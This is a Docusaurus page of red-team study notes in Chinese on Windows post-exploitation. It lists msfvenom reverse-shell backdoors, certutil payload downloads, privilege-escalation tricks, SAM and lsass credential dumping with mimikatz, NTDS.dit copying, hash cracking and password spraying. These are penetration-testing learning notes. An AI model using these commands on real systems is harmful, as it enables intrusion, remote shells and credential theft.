<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Cyber-Security/Red_Team/Windows_Post_Exploitation" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 後滲透 | Welcome to Jonathan&#x27;s site！</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://jonafk555.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://jonafk555.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 後滲透 | Welcome to Jonathan&#x27;s site！"><meta data-rh="true" name="description" content="- Msfvenom"><meta data-rh="true" property="og:description" content="- Msfvenom"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation"><link data-rh="true" rel="alternate" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation" hreflang="en"><link data-rh="true" rel="alternate" href="https://jonafk555.github.io/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.e5a10a03.css">
<script src="/assets/js/runtime~main.c84f042a.js" defer="defer"></script>
<script src="/assets/js/main.234aa50a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Entry Point</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/category/cyber-security-資訊安全">Notes</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/jonafk555" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/cyber-security-資訊安全">Cyber Security 資訊安全</a><button aria-label="Collapse sidebar category &#x27;Cyber Security 資訊安全&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/red-team-紅隊安全">Red Team 紅隊安全</a><button aria-label="Collapse sidebar category &#x27;Red Team 紅隊安全&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/AD_Pentest">紅隊安全 | AD 網域滲透測試</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation">紅隊安全 | Linux 後滲透</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/Powershell">紅隊安全 | 不開啟 Powershell 執行 powershell.exe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Cyber-Security/Red_Team/Windows_Post_Exploitation">紅隊安全 | Windows 後滲透</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/lolbas">紅隊安全 | LOLBAS 下載工具</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Cyber-Security/Red_Team/pivoting">紅隊安全 | 端口轉發與跳板</a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/forensic-medicine-法醫學">Forensic Medicine 法醫學</a><button aria-label="Expand sidebar category &#x27;Forensic Medicine 法醫學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/forensic-science-鑑識科學">Forensic Science 鑑識科學</a><button aria-label="Expand sidebar category &#x27;Forensic Science 鑑識科學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/criminology-犯罪學">Criminology 犯罪學</a><button aria-label="Expand sidebar category &#x27;Criminology 犯罪學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/biochemistry-生物化學">Biochemistry 生物化學</a><button aria-label="Expand sidebar category &#x27;Biochemistry 生物化學&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">intro</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/cyber-security-資訊安全"><span itemprop="name">Cyber Security 資訊安全</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/red-team-紅隊安全"><span itemprop="name">Red Team 紅隊安全</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">紅隊安全 | Windows 後滲透</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 後滲透</h1></header>
<h1>Reverse shell</h1>
<ul>
<li>Msfvenom<!-- -->
<ul>
<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; s.exe</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="本地-download-遠端-reverse-shell">本地 Download 遠端 Reverse shell<a href="#本地-download-遠端-reverse-shell" class="hash-link" aria-label="Direct link to 本地 Download 遠端 Reverse shell" title="Direct link to 本地 Download 遠端 Reverse shell">​</a></h2>
<ul>
<li>Windows：<code>certutil -urlcache -f URL OUTFILE</code></li>
<li>Living Off The Land Binaries：<a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">https://lolbas-project.github.io/</a> --&gt; 用白名單 Binary 下載</li>
</ul>
<h1>Information Gathering</h1>
<ul>
<li>我是誰：<!-- -->
<ul>
<li><code>whoami</code></li>
<li><code>echo %username%</code></li>
</ul>
</li>
<li>我在哪：<!-- -->
<ul>
<li><code>hostname</code>：電腦名稱</li>
<li><code>systeminfo</code>：系統的各種資訊</li>
<li><code>tasklist</code>：類似工作管理員</li>
<li><code>cd</code>：不帶參數可以作為 linux 的 pwd 使用</li>
</ul>
</li>
</ul>
<h1>Privilege Escalation</h1>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">NT Authority\System 高權限</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT Authority\Network Service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT Authority\Local Service 平常在這</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT Authority\IUSR</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>Local Admin 比 Domain Admin 好拿<!-- -->
<ul>
<li>net localgroup &quot;Administrators”</li>
<li>net user Administrators</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="手動枚舉密碼">手動枚舉密碼<a href="#手動枚舉密碼" class="hash-link" aria-label="Direct link to 手動枚舉密碼" title="Direct link to 手動枚舉密碼">​</a></h2>
<ul>
<li><code>findstr /SIM /C:&quot;password&quot; *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="自動化工具利用">自動化工具利用<a href="#自動化工具利用" class="hash-link" aria-label="Direct link to 自動化工具利用" title="Direct link to 自動化工具利用">​</a></h2>
<ul>
<li>
<p>Windows Exploit Suggester - Next Generation (WES-NG)：
<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener noreferrer">https://github.com/bitsadmin/wesng</a></p>
<ul>
<li>匯出 systeminfo
<code>systeminfo &gt; systeminfo.txt</code></li>
<li>更新資料庫
<code>python wes.py --update</code></li>
<li>比對弱點 --&gt; 利用提權漏洞
<code>python wes.py systeminfo.txt -e</code></li>
</ul>
</li>
<li>
<p>Winpeas</p>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20231011-b4d494e5" target="_blank" rel="noopener noreferrer">https://github.com/carlospolop/PEASS-ng/releases/tag/20231011-b4d494e5</a></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="bypass-uac-user-account-control">Bypass UAC (User account control)<a href="#bypass-uac-user-account-control" class="hash-link" aria-label="Direct link to Bypass UAC (User account control)" title="Direct link to Bypass UAC (User account control)">​</a></h2>
<ul>
<li>執行後可以以高權限執行程式</li>
<li>Tool：<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener noreferrer">https://github.com/hfiref0x/UACME</a></li>
<li><a href="https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82" target="_blank" rel="noopener noreferrer">SCMUACBypass</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="劫持-token">劫持 Token<a href="#劫持-token" class="hash-link" aria-label="Direct link to 劫持 Token" title="Direct link to 劫持 Token">​</a></h2>
<ul>
<li>PrintSpoofer<!-- -->
<ul>
<li><code>Local/Network</code> Service to <code>SYSTEM</code></li>
<li><a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">https://github.com/itm4n/PrintSpoofer</a></li>
<li>usage：<code>PrintSpoofer.exe -c &quot;command&quot;</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="insecure-service-permissions">Insecure Service Permissions<a href="#insecure-service-permissions" class="hash-link" aria-label="Direct link to Insecure Service Permissions" title="Direct link to Insecure Service Permissions">​</a></h2>
<ol>
<li>查看 service 存取：<code>accesschk.exe /accepteula -uwcqv &lt;user&gt; *</code></li>
<li>查看 service 權限 (要有<code>SYSTEM</code>可以執行的權限)：<code>wmic service where name=&quot;&lt;service&gt;&quot; get name, caption, state, startmode, startname</code></li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="service-unquoted-path">Service Unquoted Path<a href="#service-unquoted-path" class="hash-link" aria-label="Direct link to Service Unquoted Path" title="Direct link to Service Unquoted Path">​</a></h2>
<ul>
<li>Windows 在處理含有空白的路徑時，需要以雙引號框起。</li>
<li>沒有用雙引號框起就有機會觸發 Unquoted Service Paths 而達到提權。</li>
<li><code>C:\Program Files\Program\My files\game.exe</code> 由上而下解析：<!-- -->
<ul>
<li><code>C:\Program.exe</code></li>
<li><code>C:\Program Files\Program\My.exe</code></li>
<li><code>C:\Program Files\Program\My files\game.exe</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用方式">利用方式<a href="#利用方式" class="hash-link" aria-label="Direct link to 利用方式" title="Direct link to 利用方式">​</a></h3>
<ol>
<li><code>wmic service get name,displayname,pathname,startmode</code> 列出服務路  徑。</li>
<li>msfvenom 製作後門，命名為 <code>My.exe</code></li>
<li>上傳後門至 <code>C:\Program Files\Program\</code></li>
<li>重啟服務，觸發惡意文件執行。</li>
<li>提權至 <code>BUILTIN\Administrators</code></li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="安裝提權原則">安裝提權原則<a href="#安裝提權原則" class="hash-link" aria-label="Direct link to 安裝提權原則" title="Direct link to 安裝提權原則">​</a></h2>
<ol>
<li>安裝AlwaysInstallElevated</li>
</ol>
<ul>
<li><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
<li><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
</ul>
<ol start="2">
<li>msfvenom 生成後門(.msi安裝檔)</li>
</ol>
<ul>
<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;PORT&gt; -f msi -o office.msi</code></li>
</ul>
<ol start="3">
<li>遠端掛載kali目錄</li>
<li>rdp 開該掛載目錄，並執行安裝</li>
<li>取得<code>SYSTEM</code> 權限</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="權限低到高下到上">權限低到高(下到上)<a href="#權限低到高下到上" class="hash-link" aria-label="Direct link to 權限低到高(下到上)" title="Direct link to 權限低到高(下到上)">​</a></h3>
<ul>
<li>NT AUTHORITY\SYSTEM</li>
<li>BUILTIN\Administrators</li>
<li>電腦名稱\使用者名稱(一般使用者)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="從-administrators-提權到-system">從 Administrators 提權到 System<a href="#從-administrators-提權到-system" class="hash-link" aria-label="Direct link to 從 Administrators 提權到 System" title="Direct link to 從 Administrators 提權到 System">​</a></h3>
<ul>
<li>前提：提權後的使用者已經在 Admin 群組</li>
<li>從 Administrators 提權到 System 是 Feature ，不是漏洞</li>
<li>經過提權後到 <strong>Administrators</strong> 的 shell：<code>psexec.exe -s -i cmd.exe</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="密碼收集">密碼收集<a href="#密碼收集" class="hash-link" aria-label="Direct link to 密碼收集" title="Direct link to 密碼收集">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sam">SAM<a href="#sam" class="hash-link" aria-label="Direct link to SAM" title="Direct link to SAM">​</a></h3>
<blockquote>
<p>Security Account Manager，存儲用戶密碼
位置：<code>C:\Windows\System32\config\SAM</code></p>
</blockquote>
<p>匯出 SAM 檔：</p>
<ul>
<li>USAGE-1：<!-- -->
<ul>
<li><code>reg save HKLM\SAM &lt;save_filename&gt;</code></li>
<li><code>reg save HKLM\SYSTEM &lt;save_filename&gt;</code>
<ul>
<li>Default file name：C:\inetpub\wwwroot\sam.zip</li>
</ul>
</li>
</ul>
</li>
<li>USAGE-2：<!-- -->
<ul>
<li>利用劫持 token 來獲得SAM<!-- -->
<ul>
<li><code>PrintSpoofer64.exe -c &quot;reg save HKLM\SAM C:\inetpub\wwwroot\sam.zip&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>USAGE-3：<!-- -->
<ul>
<li><code>Invoke-NinjaCopy</code>：<!-- -->
<ul>
<li>Github:
<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener noreferrer">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></li>
<li><code>Invoke-NinjaCopy -Path SAM -LocalDestination SAM_COPY</code></li>
</ul>
</li>
</ul>
</li>
<li>解析SAM<!-- -->
<ul>
<li>pwdump.py</li>
<li>samdump2</li>
</ul>
</li>
<li><code>move sam.save \\&lt;ip&gt;\NameofFileShare</code></li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dehash">deHash<a href="#dehash" class="hash-link" aria-label="Direct link to deHash" title="Direct link to deHash">​</a></h3>
<ul>
<li>online dehash: <a href="https://www.cmd5.com/" target="_blank" rel="noopener noreferrer">https://www.cmd5.com/</a></li>
<li>Hashcat<!-- -->
<ul>
<li><code>hashcat -a 0 -m 1000 ntlm.hash pass.dict --force</code></li>
</ul>
</li>
<li>john<!-- -->
<ul>
<li><code>john ntlm.hash -w=pass.dict --format=NT</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="lsass">lsass<a href="#lsass" class="hash-link" aria-label="Direct link to lsass" title="Direct link to lsass">​</a></h3>
<ul>
<li>微軟會將使用者憑證資訊暫存在 lsass.exe<!-- -->
<ul>
<li><code>Get-Process lsass</code></li>
</ul>
</li>
<li><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></li>
<li><code>pypykatz lsa minidump /path/to/lsassdumpfile</code></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener noreferrer">mimikatz</a>
<ul>
<li>AV 可能會殺 --&gt; 解法：Dump-memory</li>
<li>取得 Administrator後使用</li>
<li>解析其記憶體內容，挖出帳號、Hash</li>
<li>管理員權限開啟</li>
<li><code>privilege::debug</code>：切換到 Debug 權限</li>
<li><code>sekurlsa::logonpasswords</code>
<ul>
<li>取得 LSASS 中的登入密碼</li>
</ul>
</li>
<li><code>misc::memssp</code>
<ul>
<li>處理lsass內存，透過標識和patch函數以重定向執行來進行。</li>
</ul>
</li>
</ul>
</li>
<li><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code> (用於 DCsync)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dump-memory">Dump memory<a href="#dump-memory" class="hash-link" aria-label="Direct link to Dump memory" title="Direct link to Dump memory">​</a></h2>
<ul>
<li>
<p>Procdump：<a href="https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump</a></p>
<ul>
<li>取得 minidump：<code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></li>
<li>mimikatz：
<code>Sekurlsa::minidump “/To/PATH/lsass.dmp”</code>
<code>Sekurlsa::logonPasswords</code></li>
</ul>
</li>
<li>
<p>記憶體鑑識工具</p>
<ul>
<li>Rekall</li>
<li>Volatility</li>
<li>Windbg</li>
</ul>
</li>
</ul>
<h1>Attacking Service</h1>
<ul>
<li>enum4linux 枚舉：<!-- -->
<ul>
<li><code>enum4linux-ng.py &lt;IP&gt; -A -C</code></li>
<li><code>enum4linux &lt;IP&gt; -A -C</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="nfs">NFS<a href="#nfs" class="hash-link" aria-label="Direct link to NFS" title="Direct link to NFS">​</a></h2>
<ul>
<li><code>showmount -e &lt;IP&gt;</code></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ftp">ftp<a href="#ftp" class="hash-link" aria-label="Direct link to ftp" title="Direct link to ftp">​</a></h2>
<ul>
<li><code>ftp &lt;IP&gt; &lt;port&gt;</code>(Port 預設是 21)<!-- -->
<ul>
<li>匿名登入：root/anonymous</li>
<li><code>dir</code>(列舉內容), <code>prompt</code>, <code>mget</code>(下載)</li>
</ul>
</li>
<li><code>wget -m --no-passive ftp://anonymous:anonymous@&lt;IP&gt;</code> 下載所有檔案</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="smb">SMB<a href="#smb" class="hash-link" aria-label="Direct link to SMB" title="Direct link to SMB">​</a></h2>
<ul>
<li>開啟共享目錄：<!-- -->
<ul>
<li>CMD：<!-- -->
<ul>
<li><code>dir \\IP\FILE\</code></li>
<li><code>net use n: \\IP\FILE\</code></li>
</ul>
</li>
<li>PowerShell：<!-- -->
<ul>
<li><code>Get-ChildItem \\IP\FILE\</code></li>
<li><code>New-PSDrive -Name &quot;N&quot; -Root &quot;\\IP\FILE\&quot; -PSProvider &quot;FileSystem&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>如果需要登入權限：<!-- -->
<ul>
<li><code>net use n: \\IP\FILE\ /user:&lt;user&gt; &lt;Password&gt;</code></li>
</ul>
</li>
<li>搜尋敏感資料：<!-- -->
<ul>
<li><code>dir n:\*...* /s /b</code>
<ul>
<li>... 可以是任意可能存放敏感資訊的資料夾名稱：</li>
<li>credential</li>
<li>password</li>
<li>key</li>
<li>license</li>
<li>config</li>
<li>...</li>
</ul>
</li>
<li>windows CMD 指令：<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr" target="_blank" rel="noopener noreferrer">findstr</a></li>
</ul>
</li>
<li><code>smbclient -N -L //&lt;IP&gt;</code>
<ul>
<li><code>-N</code> No password 匿名登入</li>
</ul>
</li>
<li>smbmap 可以告訴我們當前權限可以存取哪些檔案：<code>smbmap -H &lt;IP&gt;</code>
<ul>
<li><code>-r &lt;資料夾&gt;</code> 遞迴開啟資料夾</li>
<li><code>--download &lt;相對路徑&gt;</code> 下載目標檔案</li>
<li><code>--upload &lt;上傳的檔案&gt; &quot;&lt;路徑+檔名&gt;&quot;</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="password-sparying">Password Sparying<a href="#password-sparying" class="hash-link" aria-label="Direct link to Password Sparying" title="Direct link to Password Sparying">​</a></h3>
<ul>
<li><code>crackmapexec smb &lt;IP&gt; -u /tmp/userlist.txt -p &#x27;&lt;password&gt;&#x27; --local-auth</code>
<ul>
<li>找到一組帳密後繼續灑：<code>--continue-on-success</code></li>
<li><code>--local-auth</code>：目前的電腦可以登過去的</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="forced-authentication-attacks">Forced Authentication Attacks<a href="#forced-authentication-attacks" class="hash-link" aria-label="Direct link to Forced Authentication Attacks" title="Direct link to Forced Authentication Attacks">​</a></h3>
<ul>
<li><code>sudo responder -I &lt;interface&gt;</code></li>
</ul>
